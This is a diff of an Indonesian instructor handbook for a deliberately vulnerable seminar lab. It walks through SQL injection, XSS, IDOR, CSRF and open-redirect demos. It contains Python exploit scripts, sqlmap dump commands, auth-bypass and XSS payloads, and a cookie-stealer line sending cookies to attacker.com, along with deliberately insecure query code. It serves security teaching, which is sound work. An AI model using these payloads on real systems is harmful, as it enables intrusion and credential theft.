@@ -1,193 +1,79 @@
-# 🕵️ ACT LAB - Instructor Cheat Sheet (HTB Edition)
+# 🛡️ ACT LAB :: INSTRUCTOR HANDBOOK (NATIONAL SEMINAR EDITION)
 
-Dokumen ini adalah panduan rahasia bagi instruktur/pembicara untuk mendemonstrasikan kerentanan di ACT LAB dengan gaya profesional ala HackTheBox.
-
----
-
-## 🛠️ Global Mission Setup
-- **Platform**: Node.js + SQLite (Persistent)
-- **UI Standard**: HTB-Dark Mode (Clean, High Contrast)
-- **Monitor Terminal**: Gunakan panel "Console Log" di setiap lab untuk memvisualisasikan request secara real-time di depan audiens.
+Selamat datang di modul panduan instruktur. Dokumen ini dirancang untuk membantu penyampaian materi eksploitasi secara live. Fokus kita adalah pada metodologi **Manual** dan **Automated** menggunakan tools standar industri.
 
 ---
 
-## 1. SQL Injection (Authentication Bypass)
-**Vulnerability Type**: In-band SQLi (Auth logic subversion)
-**Target**: `admin` account access without password.
+## 1. SQL INJECTION (SQLi) - AUTH BYPASS
+**Target:** Login Page (`/lab/sqli-login`)
 
-### 🚩 Exploitation Methods
-#### A. Manual (Browser)
-1. Buka halaman login.
-2. Masukkan username: `admin`
-3. Masukkan password: `' OR '1'='1`
-4. Klik Login.
-
-#### B. Automated (Python Script)
-```python
-import requests
-
-url = "http://target.com/api/auth/login"
-payload = {
-    "username": "admin",
-    "password": "' OR '1'='1"
-}
-
-r = requests.post(url, json=payload)
-if "flag" in r.text:
-    print(f"[+] Login Bypassed! Flag: {r.json()['flag']}")
-```
-
-### 💻 Vulnerable Code (`api/auth.js`)
-```javascript
-const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
-// Database mengeksekusi string mentah tanpa sanitasi.
-```
-
-### 💡 Presentation Tips
-1. Masukkan password asal-asalan dulu (Gagal).
-2. Tunjukkan panel **Query Analyzer**, masukkan payload.
-3. Jelaskan bagaimana `'` menutup string dan `--` menonaktifkan sisa logika AND password.
-
-### 🛡️ Mitigation
-Gunakan **Parameterized Queries**:
-```javascript
-db.get('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);
-```
+### Metodologi Manual (Tutor Style)
+*   **Analisis Awal:** Masukkan karakter `'` (single quote) pada kolom password. Jelaskan ke audiens bahwa error atau respon aneh menunjukkan input tidak di-sanitasi.
+*   **Payload Universal:** 
+    *   `admin' --` (Bypass username)
+    *   `' OR '1'='1' --` (Bypass password logic)
+    *   `") OR ("1"="1" --` (Payload nyeleneh untuk bypass filter kurung)
+*   **Burp Suite Step:** 
+    1. Intercept request POST ke `/api/auth/login`.
+    2. Kirim ke **Intruder**.
+    3. Gunakan wordlist `SQLi - Auth Bypass` untuk menunjukkan betapa cepatnya bypass ini dilakukan.
 
 ---
 
-## 2. SQL Injection (UNION-Based Exfiltration)
-**Vulnerability Type**: In-band UNION SQLi
-**Target**: Mengekstrak seluruh database `users` (Username & Password).
+## 2. SQL INJECTION (SQLi) - UNION BASED
+**Target:** Search Field (`/lab/sqli-union`)
 
-### 🚩 Exploitation Methods
-#### A. Manual (Browser)
-1. Di kolom search, masukkan: `' UNION SELECT id, username, password, email FROM users --`
-2. Hasil pencarian akan menampilkan isi tabel `users`.
-
-#### B. Automated (Python Script)
-```python
-import requests
-
-url = "http://target.com/api/search"
-payload = "' UNION SELECT id, username, password, email FROM users --"
-r = requests.get(url, params={"q": payload})
-
-if r.status_code == 200:
-    users = r.json()['results']
-    for user in users:
-        print(f"ID: {user['id']} | User: {user['username']} | Pass: {user['password']}")
-```
-
-### 💻 Vulnerable Code (`api/search.js`)
-```javascript
-const query = `SELECT id, title, description, category FROM challenges WHERE title LIKE '%${q}%'`;
-```
-
-### 💡 Presentation Tips
-- Tekankan pada **Matching Columns**. Tunjukkan error jika jumlah kolom tidak sama (4 kolom).
-- Sorot hasil pencarian yang tiba-tiba memunculkan kredensial admin di tengah daftar mission.
+### Eksploitasi Automated (SQLmap)
+Sampaikan bahwa dalam audit nyata, kita menggunakan otomasi untuk menghemat waktu.
+*   **Command:** 
+    ```bash
+    sqlmap -u "http://act-lab.app/api/search?q=test" --batch --dbs
+    ```
+*   **Dumping Data:**
+    ```bash
+    sqlmap -u "http://act-lab.app/api/search?q=test" -D actlab -T challenges --dump
+    ```
+*   **Point Utama:** Jelaskan bagaimana SQLmap mendeteksi jumlah kolom secara otomatis menggunakan teknik UNION.
 
 ---
 
-## 3. Reflected XSS (Execution Sink)
-**Vulnerability Type**: Reflected Cross-Site Scripting
-**Target**: Trigger alert atau pencurian session token.
+## 3. XSS (CROSS-SITE SCRIPTING) - STORED
+**Target:** Guestbook (`/lab/xss-stored`)
 
-### 🚩 Exploitation Payloads
-- **Simple Alert**: `<script>alert(1)</script>`
-- **Flag Capture**: `<script>getFlag()</script>` (Trigger fungsi rahasia di lab)
-- **HTML Injection**: `<h1>HACKED</h1>`
-
-### 💻 Vulnerable Code (`views/labs/xss-reflected.html`)
-```javascript
-target.innerHTML = q; // Input URL langsung ditempel ke DOM tanpa escaping.
-```
-
-### 💡 Presentation Tips
-- Jelaskan konsep **Source** (URL Parameter) dan **Sink** (innerHTML).
-- Masukkan payload di URL, copy-paste URL tersebut ke tab baru untuk mensimulasikan link pancingan (phishing).
+### Metodologi Phishing & Cookie Stealing
+*   **Payload Nyeleneh:** 
+    *   `<img src=x onerror=alert(1)>` (Klasik)
+    *   `<svg/onload=alert('ACT_PWNED')>` (Bypass filter tag script)
+    *   `<details open ontoggle=alert(document.cookie)>` (Payload modern)
+*   **Demonstrasi:** Jelaskan bahwa payload ini tersimpan di database. Setiap kali user lain (atau admin) membuka halaman ini, script kita akan tereksekusi di browser mereka.
 
 ---
 
-## 4. Stored XSS (Persistent Payload)
-**Vulnerability Type**: Stored Cross-Site Scripting (Second Order)
-**Target**: Menginfeksi semua pengunjung Guestbook.
+## 4. IDOR (INSECURE DIRECT OBJECT REFERENCE)
+**Target:** Profile Viewer (`/lab/idor`)
 
-### 🚩 Exploitation Payloads
-- **Cookie Stealer Simulation**: 
-```html
-<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>
-```
-- **Stealth Injection**: `<img src=x onerror=getFlag()>`
-
-### 💻 Vulnerable Code (`api/guestbook.js` & Frontend)
-```javascript
-// Server menyimpan input mentah ke DB.
-// Frontend merender dengan .innerHTML
-container.innerHTML = e.message;
-```
-
-### 💡 Presentation Tips
-- Post payload, lalu **Refresh Halaman**. Tunjukkan bahwa payload tetap ada (Persistent).
-- Jelaskan bahaya XSS Stored: penyerang tidak perlu mengirim link ke korban, korban hanya perlu membuka website resmi.
+### Manipulasi Parameter (Burp Suite)
+*   **Skenario:** Peserta melihat profil mereka sendiri (`id=999`).
+*   **Eksploitasi:** 
+    1. Gunakan Burp **Repeater**.
+    2. Ubah `id=999` menjadi `id=1` atau `id=2`.
+    3. Tunjukkan bahwa kita bisa melihat data sensitif user lain tanpa izin.
+*   **Analisis:** Jelaskan pentingnya Access Control List (ACL) di sisi server.
 
 ---
 
-## 5. IDOR (Unauthorized Access)
-**Vulnerability Type**: Insecure Direct Object Reference
-**Target**: Mengintip bio rahasia user `Alice` (ID #2).
+## 5. OPEN REDIRECT
+**Target:** Navigation Gateway (`/lab/redirect`)
 
-### 🚩 Exploitation Methods
-#### A. Manual (Browser)
-1. Ganti angka di input ID menjadi `2` (ID Alice).
-2. Klik **Enumerate Profile**.
-
-#### B. Automated (Python Script)
-```python
-import requests
-
-base_url = "http://target.com/api/profile"
-for i in range(1, 10):
-    r = requests.get(base_url, params={"id": i})
-    if r.status_code == 200:
-        data = r.json()['user']
-        print(f"[ID {i}] Found: {data['username']} - Bio: {data['bio']}")
-        if "ACT{" in data['bio']:
-            print(f"!!! FLAG FOUND: {data['bio']}")
-```
-
-### 💻 Vulnerable Code (`api/profile.js`)
-```javascript
-// Kode hanya mengecek ID, tidak mengecek hak akses (Authorization).
-const user = db.get('SELECT * FROM users WHERE id = ?', [req.query.id]);
-```
-
-### 💡 Presentation Tips
-- Sebutkan bahwa IDOR adalah kerentanan API paling umum saat ini.
-- Tekankan bahwa **Authentication** (Login) sudah benar, tapi **Authorization** (Hak Akses) yang lupakan.
+### Phishing Simulation
+*   **Payload:** `?url=https://evil-site.com`
+*   **Metode:** Tunjukkan bagaimana URL yang terlihat "aman" (berawalan domain kita) bisa menjerumuskan user ke situs berbahaya.
 
 ---
 
-## 6. CSRF (Origin Bypass)
-**Vulnerability Type**: Cross-Site Request Forgery
-**Target**: Memaksa admin mengganti email tanpa sadar.
+## 🛰️ TIPS SEMINAR
+1.  **Gunakan Burp Suite** di layar proyektor. Audiens sangat suka melihat *Raw HTTP Request*.
+2.  **Payload Nyeleneh:** Tantang peserta untuk mencoba payload dari [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Sistem kita sudah didesain universal untuk menerima variasi input selama logika SQL/HTML-nya benar.
+3.  **Kesimpulan:** Selalu tutup setiap sesi dengan **Mitigasi**. Jangan hanya ajarkan cara merusak, tapi cara memperbaiki (Parameterized Queries, Input Validation, CSP).
 
-### 🚩 Exploitation Strategy
-Server mengecek referer menggunakan `.includes('act-lab')`. Penyerang bisa bypass dengan:
-1. Menaruh file exploit di folder bernama `act-lab`.
-2. Menamai domain/subdomain penyerang mengandung kata `act-lab`.
-
-### 💡 Presentation Tips
-- Tunjukkan log terminal. Saat instruktur klik "Update", tunjukkan origin requestnya.
-- Jelaskan bahwa `.includes()` adalah "Lazy Check" yang sangat berbahaya.
-
----
-
-## 🚀 Pro Speaker Notes
-- **Always Keep the Logs Open**: Peserta seminar sangat suka melihat "apa yang terjadi di balik layar".
-- **Real World Impact**: Di setiap lab, sebutkan satu kasus nyata (misal: "XSS ini mirip dengan bug di Facebook tahun 2018").
-- **Call to Action**: Akhiri setiap demo dengan "Sekarang mari kita lihat cara memperbaikinya".
-
----
-**ACT LAB - 2026 National Seminar Series**
+**ACT LAB :: EMPOWERING CYBER SECURITY**
